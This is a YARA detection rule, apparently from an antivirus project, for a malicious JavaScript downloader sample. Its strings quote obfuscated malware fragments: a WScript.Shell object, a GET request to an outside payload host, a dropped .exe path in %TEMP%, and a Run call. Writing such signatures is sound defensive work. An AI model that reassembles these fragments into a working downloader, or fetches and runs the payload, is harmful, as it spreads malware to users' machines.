rule sig_20160328_9d23cc019f365e0fcfc8ae19f636258b {
  meta:
    description = "datamaliciousorder - file 20160328_9d23cc019f365e0fcfc8ae19f636258b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8158590de2e63c2b20d17d199a5d94b47a24580cdec6d8ee0bf1599544b75f31"

  strings:
    $s1  = "function Gcqaktz() {return Hdfwzy[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"wrZ0U2nwN.exe\";};" fullword ascii
    $s2  = "Stzooyvf[Cqnigub](\"GET\", \"http://purelaces.com/ny6sja\", false);" fullword ascii
    $s3  = "do {WScript[Jdvis](Zqckxo() * 11)} while (Stzooyvf[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Bmhwcnhjzc(Ygthv, Vswyezaja){return Ygthv - Vswyezaja;};" fullword ascii
    $s5  = "var Hdfwzy = function Fzcaf() {return WScript[Ufhnkcoklx](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Bzdcpsc() {return ((Cmosvmxe == true) && (Cmosvmxe == Ukwpxd)) ? 1 : Aliysmlwae;};" fullword ascii
    $s7  = "function Ewklpnynh(Zxshu){Hdfwzy[\"Run\"](Zxshu, Aliysmlwae, Aliysmlwae);};" fullword ascii
    $s8  = "Ukwpxd = true; " fullword ascii
    $s9  = "Cmosvmxe = true; " fullword ascii
    $s10 = "var Tqfkout = false;" fullword ascii
    $s11 = "var Heumkfjx = new this[\"Date\"]();" fullword ascii
    $s12 = "function Nuqnhk(){return Ufhnkcoklx;};" fullword ascii
    $s13 = "function Tqxksm(Ocvvispwmx) {var Vcgms = (1, 2, 3, 4, 5, Ocvvispwmx); return Vcgms;};" fullword ascii
    $s14 = "function Apszdfjwj()" fullword ascii
    $s15 = "function Xfnudgohpc(){return Wleikxm;};" fullword ascii
    $s16 = "function Zqckxo(){return 22;};" fullword ascii
    $s17 = "var Ukwpxd = false;" fullword ascii
    $s18 = "return Bmhwcnhjzc(Hotje, Bhdffdkwps);" fullword ascii
    $s19 = " while (Spssqicz){" fullword ascii
    $s20 = "var Cmosvmxe = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}